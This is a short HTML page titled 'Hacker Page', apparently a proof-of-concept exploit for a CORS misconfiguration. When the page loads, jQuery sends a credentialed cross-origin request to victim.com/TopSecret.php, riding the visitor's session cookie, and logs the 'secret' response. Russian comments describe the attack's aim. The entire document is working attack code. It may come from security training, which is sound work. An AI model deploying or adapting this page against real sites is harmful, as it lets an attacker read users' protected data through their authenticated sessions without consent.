<!DOCTYPE html>
<html>
<head>
    <title>Hacker Page</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>
<body>
    <script>
        $(document).ready(function() {
            // Отправляем AJAX-запрос на TopSecret.php с нужным sessionid в куки
            $.ajax({
                url: 'http://victim.com/TopSecret.php',
                type: 'GET',
                xhrFields: {
                    withCredentials: true
                },
                success: function(data) {
                    // Обрабатываем ответ и сохраняем "секретные" данные
                    console.log(data);
                },
                error: function(xhr, status, error) {
                    console.log(error);
                }
            });
        });
    </script>
</body>
</html>
